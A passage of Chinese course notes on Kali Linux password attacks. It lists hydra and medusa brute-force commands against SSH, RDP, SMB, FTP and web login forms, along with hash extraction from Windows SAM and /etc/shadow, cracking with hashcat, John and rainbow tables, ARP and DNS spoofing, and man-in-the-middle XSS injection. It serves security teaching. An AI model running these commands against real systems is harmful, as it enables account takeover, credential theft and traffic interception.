<h2 id="字典-7"><a href="#字典-7" class="headerlink" title="字典"></a>字典</h2><h3 id="通过收集网站信息生成字典"><a href="#通过收集网站信息生成字典" class="headerlink" title="通过收集网站信息生成字典"></a>通过收集网站信息生成字典</h3><h3 id="cewl-1-1-1-1-m-3-d-3-e-c-v-w-a-txt"><a href="#cewl-1-1-1-1-m-3-d-3-e-c-v-w-a-txt" class="headerlink" title="cewl 1.1.1.1 -m 3 -d 3 - e -c -v -w a.txt"></a>cewl 1.1.1.1 -m 3 -d 3 - e -c -v -w a.txt</h3><ul>
<li>-m：最小单词长度</li>
<li>-d：爬网深度</li>
<li>-e：收集包含email地址信息</li>
<li>-c：每个单词出现次数</li>
<li>支持基本、摘要 身份认证</li>
<li>支持代理</li>
</ul>
<h2 id="字典-8"><a href="#字典-8" class="headerlink" title="字典"></a>字典</h2><h3 id="用户密码变型"><a href="#用户密码变型" class="headerlink" title="用户密码变型"></a>用户密码变型</h3><ul>
<li>基于 cewl 的结果进行密码变型</li>
<li>末尾增加数字串</li>
<li>字母大小写变化</li>
<li>字母与符号互相转换</li>
<li>字母与数字互相转换</li>
<li>P@$$w0rd</li>
</ul>
<h2 id="字典-9"><a href="#字典-9" class="headerlink" title="字典"></a>字典</h2><h3 id="使用-John-the-Ripper-配置文件实现密码动态变型"><a href="#使用-John-the-Ripper-配置文件实现密码动态变型" class="headerlink" title="使用 John the Ripper 配置文件实现密码动态变型"></a>使用 John the Ripper 配置文件实现密码动态变型</h3><h3 id="x2F-etc-x2F-john-x2F-john-conf"><a href="#x2F-etc-x2F-john-x2F-john-conf" class="headerlink" title="&#x2F;etc&#x2F;john&#x2F;john.conf"></a>&#x2F;etc&#x2F;john&#x2F;john.conf</h3><ul>
<li>[List.Rules:Wordlist]</li>
<li>$[ 0 - 9]$[0-9]$[0- 9 ]</li>
<li>john –wordlist&#x3D;cewl.txt –rules –stdout &gt; m.txt</li>
<li>[List.Rules:test]<br>  $[0-9]$[0-9]$[0-9]$[a-zA-Z]<br>  $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[&#96;~!@#$%^&amp;*()-_&#x3D;+]</li>
<li>john –wordlist&#x3D;cewl.txt –rules&#x3D;test –stdout &gt; m.txt</li>
<li>john –wordlist&#x3D;ahm.lst –rules&#x3D;test HASHFILE</li>
</ul>
<h2 id="在线密码破解——hydra"><a href="#在线密码破解——hydra" class="headerlink" title="在线密码破解——hydra"></a>在线密码破解——hydra</h2><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><h5 id="–-九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀"><a href="#–-九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀" class="headerlink" title="– 九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀"></a>– 九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</h5><h2 id="在线密码破解——hydra-1"><a href="#在线密码破解——hydra-1" class="headerlink" title="在线密码破解——hydra"></a>在线密码破解——hydra</h2><h3 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><ul>
<li>hydra -l administrator -P pass.lst smb:&#x2F;&#x2F;1.1.1.1&#x2F;admin$ -vVd</li>
<li>hydra -l administrator -P pass.lst rdp:&#x2F;&#x2F;1.1.1.1 -t 1 -vV</li>
</ul>
<h3 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h3><ul>
<li>hydra -l root -P pass.lst ssh:&#x2F;&#x2F;1.1.1.1 -vV</li>
</ul>
<h3 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a>其他服务密码破解</h3><ul>
<li>hydra -L user.lst -P pass.lst <a href="ftp://1.1.1.1/">ftp://1.1.1.1</a> -s 2121 -e nsr -o p.txt -t 64</li>
</ul>
<h3 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h3><ul>
<li>xhydra</li>
</ul>
<h2 id="在线密码破解——hydra-2"><a href="#在线密码破解——hydra-2" class="headerlink" title="在线密码破解——hydra"></a>在线密码破解——hydra</h2><h3 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a>HTTP表单身份认证</h3><ul>
<li>hydra -l admin -P pass.lst 1.1.1.1 http-post-form<br>  “&#x2F;dvwa&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;Login&#x3D;L<br>  in:S&#x3D;index.php” -V</li>
<li>hydra -l admin -P pass.lst 1.1.1.1 http-post-form<br>  “&#x2F;dvwa&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;Login&#x3D;L<br>  in:LoginFailed” -V</li>
<li>&#x2F;foo.php:user&#x3D;^USER^&amp;pass&#x3D;^PASS^:S&#x3D;success:C&#x3D;&#x2F;page&#x2F;cookie:H<br>  &#x3D;X-Foo: Foo<br>   C：先访问指定页面取得cookie<br>   H：指定http头</li>
<li>https-post-form、http-get-form、https-get-form</li>
<li>-S：使用SSL连接</li>
</ul>
<h2 id="在线密码破解——hydra-3"><a href="#在线密码破解——hydra-3" class="headerlink" title="在线密码破解——hydra"></a>在线密码破解——hydra</h2><h3 id="pw-inspector"><a href="#pw-inspector" class="headerlink" title="pw-inspector"></a>pw-inspector</h3><h5 id="–-按长度和字符集筛选字典"><a href="#–-按长度和字符集筛选字典" class="headerlink" title="– 按长度和字符集筛选字典"></a>– 按长度和字符集筛选字典</h5><ul>
<li>pw-inspector -i &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;nmap.lst -o p.lst -l</li>
<li>pw-inspector -i &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;nmap.lst -o P.lst -u</li>
</ul>
<h3 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a>密码破解效率</h3><h5 id="–-密码复杂度（字典命中率）"><a href="#–-密码复杂度（字典命中率）" class="headerlink" title="– 密码复杂度（字典命中率）"></a>– 密码复杂度（字典命中率）</h5><h5 id="–-带宽、协议、服务器性能、客户端性能"><a href="#–-带宽、协议、服务器性能、客户端性能" class="headerlink" title="– 带宽、协议、服务器性能、客户端性能"></a>– 带宽、协议、服务器性能、客户端性能</h5><h5 id="–-锁定阈值"><a href="#–-锁定阈值" class="headerlink" title="– 锁定阈值"></a>– 锁定阈值</h5><h5 id="–-单位时间最大登陆请求次数"><a href="#–-单位时间最大登陆请求次数" class="headerlink" title="– 单位时间最大登陆请求次数"></a>– 单位时间最大登陆请求次数</h5><h2 id="在线密码破解——medusa"><a href="#在线密码破解——medusa" class="headerlink" title="在线密码破解——medusa"></a>在线密码破解——medusa</h2><h3 id="Hydra-的缺点"><a href="#Hydra-的缺点" class="headerlink" title="Hydra 的缺点"></a>Hydra 的缺点</h3><h5 id="–-稳定性差，程序时常崩溃"><a href="#–-稳定性差，程序时常崩溃" class="headerlink" title="– 稳定性差，程序时常崩溃"></a>– 稳定性差，程序时常崩溃</h5><h5 id="–-速度控制不好，容易触发服务屏蔽或锁死机制"><a href="#–-速度控制不好，容易触发服务屏蔽或锁死机制" class="headerlink" title="– 速度控制不好，容易触发服务屏蔽或锁死机制"></a>– 速度控制不好，容易触发服务屏蔽或锁死机制</h5><h5 id="–-每主机新建进程，每服务新建实例"><a href="#–-每主机新建进程，每服务新建实例" class="headerlink" title="– 每主机新建进程，每服务新建实例"></a>– 每主机新建进程，每服务新建实例</h5><h5 id="–-大量目标破解时性能差"><a href="#–-大量目标破解时性能差" class="headerlink" title="– 大量目标破解时性能差"></a>– 大量目标破解时性能差</h5><h3 id="Medusa-的特点"><a href="#Medusa-的特点" class="headerlink" title="Medusa 的特点"></a>Medusa 的特点</h3><h5 id="–-稳定性好"><a href="#–-稳定性好" class="headerlink" title="– 稳定性好"></a>– 稳定性好</h5><h5 id="–-速度控制得当"><a href="#–-速度控制得当" class="headerlink" title="– 速度控制得当"></a>– 速度控制得当</h5><h5 id="–-基于线程"><a href="#–-基于线程" class="headerlink" title="– 基于线程"></a>– 基于线程</h5><ul>
<li>支持模块少于hydra（不支持RDP）</li>
<li>WEB-Form支持存在缺陷</li>
</ul>
<h2 id="在线密码破解——medusa-1"><a href="#在线密码破解——medusa-1" class="headerlink" title="在线密码破解——medusa"></a>在线密码破解——medusa</h2><h3 id="medusa-d"><a href="#medusa-d" class="headerlink" title="medusa -d"></a>medusa -d</h3><h3 id="破解windows密码"><a href="#破解windows密码" class="headerlink" title="破解windows密码"></a>破解windows密码</h3><ul>
<li>medusa -M smbnt -h 1.1. 1 .1 -u administrator -P pass.lst -e ns -F</li>
</ul>
<h3 id="破解Linux-SSH密码"><a href="#破解Linux-SSH密码" class="headerlink" title="破解Linux SSH密码"></a>破解Linux SSH密码</h3><ul>
<li>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</li>
</ul>
<h3 id="其他服务密码破解-1"><a href="#其他服务密码破解-1" class="headerlink" title="其他服务密码破解"></a>其他服务密码破解</h3><ul>
<li>medusa -M mysql-h 1.1.1.1 -u root -P pass.lst -e ns -F</li>
<li>medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m<br>  FORM:”dvwa&#x2F;login.php” -m DENY-SIGNAL:”login.php” -m FORM-<br>  DATA:”post?user&#x3D;username&amp;pass&#x3D;password&amp;Login&#x3D;Login”</li>
</ul>
<h2 id="在线密码破解——medusa-2"><a href="#在线密码破解——medusa-2" class="headerlink" title="在线密码破解——medusa"></a>在线密码破解——medusa</h2><h3 id="n：非默认端口"><a href="#n：非默认端口" class="headerlink" title="-n：非默认端口"></a>-n：非默认端口</h3><h3 id="s：使用SSL连接"><a href="#s：使用SSL连接" class="headerlink" title="-s：使用SSL连接"></a>-s：使用SSL连接</h3><h3 id="T：并发主机数"><a href="#T：并发主机数" class="headerlink" title="-T：并发主机数"></a>-T：并发主机数</h3><h3 id="medusa-M-ftp-q"><a href="#medusa-M-ftp-q" class="headerlink" title="medusa -M ftp -q"></a>medusa -M ftp -q</h3><h2 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h2><h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><h5 id="–-禁止明文传输密码"><a href="#–-禁止明文传输密码" class="headerlink" title="– 禁止明文传输密码"></a>– 禁止明文传输密码</h5><h5 id="–-每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）"><a href="#–-每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）" class="headerlink" title="– 每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）"></a>– 每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</h5><h5 id="–-服务器端用户数据库应加盐加密保存"><a href="#–-服务器端用户数据库应加盐加密保存" class="headerlink" title="– 服务器端用户数据库应加盐加密保存"></a>– 服务器端用户数据库应加盐加密保存</h5><h3 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h3><h5 id="–-嗅探获取密码HASH"><a href="#–-嗅探获取密码HASH" class="headerlink" title="– 嗅探获取密码HASH"></a>– 嗅探获取密码HASH</h5><h5 id="–-利用漏洞登陆服务器并从用户数据库获取密码HASH"><a href="#–-利用漏洞登陆服务器并从用户数据库获取密码HASH" class="headerlink" title="– 利用漏洞登陆服务器并从用户数据库获取密码HASH"></a>– 利用漏洞登陆服务器并从用户数据库获取密码HASH</h5><h5 id="–-识别HASH类型"><a href="#–-识别HASH类型" class="headerlink" title="– 识别HASH类型"></a>– 识别HASH类型</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 长度、字符集</span><br></pre></td></tr></table></figure>
<ul>
<li>利用离线破解工具碰撞密码HASH</li>
</ul>
<h2 id="离线密码破解-1"><a href="#离线密码破解-1" class="headerlink" title="离线密码破解"></a>离线密码破解</h2><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><h5 id="–-离线不会触发密码锁定机制"><a href="#–-离线不会触发密码锁定机制" class="headerlink" title="– 离线不会触发密码锁定机制"></a>– 离线不会触发密码锁定机制</h5><h5 id="–-不会产生大量登陆失败日志引起管理员注意"><a href="#–-不会产生大量登陆失败日志引起管理员注意" class="headerlink" title="– 不会产生大量登陆失败日志引起管理员注意"></a>– 不会产生大量登陆失败日志引起管理员注意</h5><h3 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h3><ul>
<li>hash‐identifier</li>
<li>Hashid</li>
<li>可能识别错误或无法识别</li>
</ul>
<h2 id="离线密码破解-2"><a href="#离线密码破解-2" class="headerlink" title="离线密码破解"></a>离线密码破解</h2><h3 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h3><ul>
<li>利用漏洞：Pwdump、fgdump、mimikatz、wce</li>
<li>物理接触：samdump2</li>
<li>Kali ISO 启动虚拟机</li>
<li>mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</li>
<li>cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</li>
<li>samdump2 SYSTEM SAM -o sam.hash</li>
<li>利用nc传输HASH</li>
</ul>
<h2 id="离线密码破解-3"><a href="#离线密码破解-3" class="headerlink" title="离线密码破解"></a>离线密码破解</h2><h3 id="Syskey工具"><a href="#Syskey工具" class="headerlink" title="Syskey工具"></a>Syskey工具</h3><ul>
<li>使用Bootkey利用RC4算法加密SAM数据库</li>
<li>Bootkey保存于SYSTEM文件中</li>
<li>Bkhive<br>   从SYSTEM文件中提取bootkey<br>   Kali 2.0 抛弃了bkhive<br>   编译安装 ：<a target="_blank" rel="noopener" href="http://http.us.debian.org/debian/pool/main/b/bkhive/">http://http.us.debian.org/debian/pool/main/b/bkhive/</a><br>   bkhive SYSTEM key<br>   samdump2 SAM key （版本已更新，不再支持此功能）</li>
<li>建议使用Kali 1.x</li>
</ul>
<h2 id="离线密码破解——Hashcat"><a href="#离线密码破解——Hashcat" class="headerlink" title="离线密码破解——Hashcat"></a>离线密码破解——Hashcat</h2><h3 id="开源多线程密码破解工具"><a href="#开源多线程密码破解工具" class="headerlink" title="开源多线程密码破解工具"></a>开源多线程密码破解工具</h3><h3 id="支持-80-多种加密算法破解"><a href="#支持-80-多种加密算法破解" class="headerlink" title="支持 80 多种加密算法破解"></a>支持 80 多种加密算法破解</h3><h3 id="基于CPU的计算能力破解"><a href="#基于CPU的计算能力破解" class="headerlink" title="基于CPU的计算能力破解"></a>基于CPU的计算能力破解</h3><h3 id="六种模式"><a href="#六种模式" class="headerlink" title="六种模式"></a>六种模式</h3><ul>
<li>0 Straight：字典破解</li>
<li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21）</li>
<li>2 Toggle case：尝试字典中所有密码的大小写字母组合</li>
<li>3 Brute force：指定字符集（或全部字符集）所有组合</li>
<li>4 Permutation：字典中密码的全部字符置换组合（12 21）</li>
<li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li>
</ul>
<h2 id="离线密码破解——Hashcat-1"><a href="#离线密码破解——Hashcat-1" class="headerlink" title="离线密码破解——Hashcat"></a>离线密码破解——Hashcat</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul>
<li>hashcat -b</li>
<li>hashcat -m 100 hash.dump pass.lst</li>
<li>hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</li>
<li>结果：hashcat.pot</li>
<li>hashcat -m 100 -a 3 hash -i –increment-min 6 –increment-max<br>  8 ?l?l?l?l?l?l?l?l</li>
<li>?l &#x3D; abcdefghijklmnopqrstuvwxyz</li>
<li>?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</li>
<li>?d &#x3D; 0123456789</li>
<li>?s &#x3D; !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~</li>
<li>?a &#x3D; ?l?u?d?s</li>
<li>?b &#x3D; 0x00 -0xff</li>
</ul>
<h2 id="离线密码破解——oclhashcat"><a href="#离线密码破解——oclhashcat" class="headerlink" title="离线密码破解——oclhashcat"></a>离线密码破解——oclhashcat</h2><h3 id="号称世界上最快、唯一的基于GPGPU的密码破解软件"><a href="#号称世界上最快、唯一的基于GPGPU的密码破解软件" class="headerlink" title="号称世界上最快、唯一的基于GPGPU的密码破解软件"></a>号称世界上最快、唯一的基于GPGPU的密码破解软件</h3><h3 id="免费开源、支持多平台、支持分布式、150-hash算法"><a href="#免费开源、支持多平台、支持分布式、150-hash算法" class="headerlink" title="免费开源、支持多平台、支持分布式、150+hash算法"></a>免费开源、支持多平台、支持分布式、150+hash算法</h3><h3 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h3><h5 id="–-虚拟机中无法使用"><a href="#–-虚拟机中无法使用" class="headerlink" title="– 虚拟机中无法使用"></a>– 虚拟机中无法使用</h5><ul>
<li>支持 CUDA 技术的Nvidia显卡</li>
<li>支持 OpenCL 技术的AMD显卡</li>
<li>安装相应的驱动</li>
</ul>
<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><h5 id="–-最大密码长度-55-字符"><a href="#–-最大密码长度-55-字符" class="headerlink" title="– 最大密码长度 55 字符"></a>– 最大密码长度 55 字符</h5><ul>
<li>使用Unicode的最大密码长度 27 字符</li>
</ul>
<h2 id="离线密码破解——oclhashcat-1"><a href="#离线密码破解——oclhashcat-1" class="headerlink" title="离线密码破解——oclhashcat"></a>离线密码破解——oclhashcat</h2><h3 id="关于版本"><a href="#关于版本" class="headerlink" title="关于版本"></a>关于版本</h3><ul>
<li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li>
</ul>
<h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><ul>
<li>oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</li>
<li>?l &#x3D; abcdefghijklmnopqrstuvwxyz</li>
<li>?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</li>
<li>?d &#x3D; 0123456789</li>
<li>?s &#x3D; !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~</li>
<li>?a &#x3D; ?l?u?d?s</li>
<li>?b &#x3D; 0x00 -0xff</li>
</ul>
<h2 id="离线密码破解——RainbowCrack"><a href="#离线密码破解——RainbowCrack" class="headerlink" title="离线密码破解——RainbowCrack"></a>离线密码破解——RainbowCrack</h2><h3 id="基于时间记忆权衡技术生成彩虹表"><a href="#基于时间记忆权衡技术生成彩虹表" class="headerlink" title="基于时间记忆权衡技术生成彩虹表"></a>基于时间记忆权衡技术生成彩虹表</h3><h3 id="提前计算密码的HASH值，通过比对HASH值破解密码"><a href="#提前计算密码的HASH值，通过比对HASH值破解密码" class="headerlink" title="提前计算密码的HASH值，通过比对HASH值破解密码"></a>提前计算密码的HASH值，通过比对HASH值破解密码</h3><h3 id="计算HASH的速度很慢，修改版支持CUDA-GPU"><a href="#计算HASH的速度很慢，修改版支持CUDA-GPU" class="headerlink" title="计算HASH的速度很慢，修改版支持CUDA GPU"></a>计算HASH的速度很慢，修改版支持CUDA GPU</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.freerainbowtables.com/en/download/">https://www.freerainbowtables.com/en/download/</a></li>
</ul>
<h3 id="KALI-中包含的RainbowCrack工具"><a href="#KALI-中包含的RainbowCrack工具" class="headerlink" title="KALI 中包含的RainbowCrack工具"></a>KALI 中包含的RainbowCrack工具</h3><ul>
<li>rtgen：预计算，生成彩虹表，耗时的阶段</li>
<li>rtsort：对rtgen生成的彩虹表进行排序</li>
<li>rcrack：查找彩虹表破解密码</li>
<li>以上命令必须顺序使用</li>
</ul>
<h2 id="离线密码破解——RainbowCrack-1"><a href="#离线密码破解——RainbowCrack-1" class="headerlink" title="离线密码破解——RainbowCrack"></a>离线密码破解——RainbowCrack</h2><h3 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h3><h5 id="–-密码明文、HASH值、HASH算法、字符集、明文长度范围"><a href="#–-密码明文、HASH值、HASH算法、字符集、明文长度范围" class="headerlink" title="– 密码明文、HASH值、HASH算法、字符集、明文长度范围"></a>– 密码明文、HASH值、HASH算法、字符集、明文长度范围</h5><h3 id="rtgen"><a href="#rtgen" class="headerlink" title="rtgen"></a>rtgen</h3><ul>
<li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160</li>
<li>rtgen md5 loweralpha 1 5 0 10000 10000 0</li>
<li>计算彩虹表时间可能很长</li>
</ul>
<h3 id="下载彩虹表"><a href="#下载彩虹表" class="headerlink" title="下载彩虹表"></a>下载彩虹表</h3><ul>
<li><a target="_blank" rel="noopener" href="http://www.freerainbowtables.com/en/tables/">http://www.freerainbowtables.com/en/tables/</a></li>
<li><a target="_blank" rel="noopener" href="http://rainbowtables.shmoo.com/">http://rainbowtables.shmoo.com/</a></li>
</ul>
<h2 id="离线密码破解——RainbowCrack-2"><a href="#离线密码破解——RainbowCrack-2" class="headerlink" title="离线密码破解——RainbowCrack"></a>离线密码破解——RainbowCrack</h2><h3 id="彩虹表排序"><a href="#彩虹表排序" class="headerlink" title="彩虹表排序"></a>彩虹表排序</h3><ul>
<li>&#x2F;usr&#x2F;share&#x2F;rainbowcrack</li>
<li>rtsort &#x2F;md5_loweralpha#1-5_0_1000x1000_0.rt</li>
</ul>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><ul>
<li>rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</li>
<li>rcrack *.rt -l hash.txt</li>
</ul>
<h2 id="离线密码破解——John"><a href="#离线密码破解——John" class="headerlink" title="离线密码破解——John"></a>离线密码破解——John</h2><h3 id="支持众多服务应用的加密破解"><a href="#支持众多服务应用的加密破解" class="headerlink" title="支持众多服务应用的加密破解"></a>支持众多服务应用的加密破解</h3><ul>
<li>john –list&#x3D;formats</li>
</ul>
<h3 id="支持某些对称加密算法破解"><a href="#支持某些对称加密算法破解" class="headerlink" title="支持某些对称加密算法破解"></a>支持某些对称加密算法破解</h3><h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><ul>
<li>Wordlist：基于规则的字典破解</li>
<li>Single crack：默认被首先执行，使用Login&#x2F;GECOS信息尝试破解</li>
<li>Incremental：所有或指定字符集的暴力破解</li>
<li>External：需要在主配配文件中用C语言子集编程</li>
</ul>
<h2 id="离线密码破解——John-1"><a href="#离线密码破解——John-1" class="headerlink" title="离线密码破解——John"></a>离线密码破解——John</h2><h3 id="默认破解模式"><a href="#默认破解模式" class="headerlink" title="默认破解模式"></a>默认破解模式</h3><ul>
<li>Single、wordlist、incremental</li>
<li>主配置文件中指定默认wordlist</li>
</ul>
<h3 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a>破解Linux系统账号密码</h3><ul>
<li>unshadow &#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;shadow &gt; pass.txt</li>
<li>john pass.txt</li>
<li>john –show pass</li>
</ul>
<h2 id="离线密码破解——John-2"><a href="#离线密码破解——John-2" class="headerlink" title="离线密码破解——John"></a>离线密码破解——John</h2><h3 id="破解windows密码-1"><a href="#破解windows密码-1" class="headerlink" title="破解windows密码"></a>破解windows密码</h3><ul>
<li>john sam.dump –wordlist&#x3D;password.lst–format&#x3D;nt</li>
<li>john sam.dump –format&#x3D;nt –show</li>
</ul>
<h3 id="Johnny-图形化界面的john"><a href="#Johnny-图形化界面的john" class="headerlink" title="Johnny 图形化界面的john"></a>Johnny 图形化界面的john</h3><h2 id="离线密码破解——Ophcrack"><a href="#离线密码破解——Ophcrack" class="headerlink" title="离线密码破解——Ophcrack"></a>离线密码破解——Ophcrack</h2><h3 id="基于彩虹表的LM、NTLM密码破解软件"><a href="#基于彩虹表的LM、NTLM密码破解软件" class="headerlink" title="基于彩虹表的LM、NTLM密码破解软件"></a>基于彩虹表的LM、NTLM密码破解软件</h3><h3 id="彩虹表：http-ophcrack-sourceforge-net-tables-php"><a href="#彩虹表：http-ophcrack-sourceforge-net-tables-php" class="headerlink" title="彩虹表：http://ophcrack.sourceforge.net/tables.php"></a>彩虹表：<a target="_blank" rel="noopener" href="http://ophcrack.sourceforge.net/tables.php">http://ophcrack.sourceforge.net/tables.php</a></h3><h2 id="离线密码破解——Ophcrack-1"><a href="#离线密码破解——Ophcrack-1" class="headerlink" title="离线密码破解——Ophcrack"></a>离线密码破解——Ophcrack</h2><h3 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h3><h2 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><h3 id="二、三层地址"><a href="#二、三层地址" class="headerlink" title="二、三层地址"></a>二、三层地址</h3><h5 id="–-IP-网络到网络"><a href="#–-IP-网络到网络" class="headerlink" title="– IP 网络到网络"></a>– IP 网络到网络</h5><h5 id="–-MAC-主机到主机"><a href="#–-MAC-主机到主机" class="headerlink" title="– MAC 主机到主机"></a>– MAC 主机到主机</h5><h3 id="交换机与HUB"><a href="#交换机与HUB" class="headerlink" title="交换机与HUB"></a>交换机与HUB</h3><h5 id="–-HUB全端口转发"><a href="#–-HUB全端口转发" class="headerlink" title="– HUB全端口转发"></a>– HUB全端口转发</h5><h5 id="–-交换机根据学习地址转发"><a href="#–-交换机根据学习地址转发" class="headerlink" title="– 交换机根据学习地址转发"></a>– 交换机根据学习地址转发</h5><h5 id="–-混杂模式抓包"><a href="#–-混杂模式抓包" class="headerlink" title="– 混杂模式抓包"></a>– 混杂模式抓包</h5><h2 id="密码嗅探-1"><a href="#密码嗅探-1" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><h5 id="–-免费ARP"><a href="#–-免费ARP" class="headerlink" title="– 免费ARP"></a>– 免费ARP</h5><h5 id="–-基于广播学习"><a href="#–-基于广播学习" class="headerlink" title="– 基于广播学习"></a>– 基于广播学习</h5><h5 id="–-以太网头、ARP头"><a href="#–-以太网头、ARP头" class="headerlink" title="– 以太网头、ARP头"></a>– 以太网头、ARP头</h5><h5 id="–-请求、响应相对独立"><a href="#–-请求、响应相对独立" class="headerlink" title="– 请求、响应相对独立"></a>– 请求、响应相对独立</h5><h5 id="–-基于传闻的协议"><a href="#–-基于传闻的协议" class="headerlink" title="– 基于传闻的协议"></a>– 基于传闻的协议</h5><h2 id="密码嗅探-2"><a href="#密码嗅探-2" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><h3 id="手动修改数据包实现ARP欺骗"><a href="#手动修改数据包实现ARP欺骗" class="headerlink" title="手动修改数据包实现ARP欺骗"></a>手动修改数据包实现ARP欺骗</h3><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><ul>
<li>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</li>
<li>arpspoof -t 1.1.1.12 -r 1.1.1.1</li>
</ul>
<h3 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h3><ul>
<li>driftnet -i eth0 -a -d tempdir-s</li>
<li>dnsspoof -i eth0 -f &#x2F;usr&#x2F;share&#x2F;dsniff&#x2F;dnsspoof.hosts</li>
<li>urlsnarf -i eth0</li>
<li>webspy -i eth0 1.1.1.10</li>
<li>dsniff -i eth0 -m<br>   &#x2F;usr&#x2F;share&#x2F;dsniff&#x2F;dsniff.services</li>
</ul>
<h2 id="密码嗅探-3"><a href="#密码嗅探-3" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><h3 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a>DNS欺骗代理</h3><ul>
<li>dnschef –fakeip&#x3D;1.1.1.10 –<br>  fakedomains&#x3D;<a target="_blank" rel="noopener" href="http://www.google.com,www.youtube.com/">www.google.com,www.youtube.com</a> –interface 1.1.1.2<ul>
<li>q</li>
</ul>
</li>
</ul>
<h3 id="将被害者DNS指向伪造的DNS服务器"><a href="#将被害者DNS指向伪造的DNS服务器" class="headerlink" title="将被害者DNS指向伪造的DNS服务器"></a>将被害者DNS指向伪造的DNS服务器</h3><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a>注入XSS</h4><ul>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li>
<li>一旦得手，影响范围巨大</li>
<li>如果中间人发生在运营商线路上，很难引起用户注意</li>
</ul>
<h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a>Mitmf 安装</h4><ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装）</li>
<li>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-<br>  queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3<br>  libcapstone-dev libffi-dev file</li>
<li>apt-get install mitmf</li>
<li>pip uninstall twisted</li>
<li>wget <a target="_blank" rel="noopener" href="http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-">http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-</a><br>  15.5.0.tar.bz2</li>
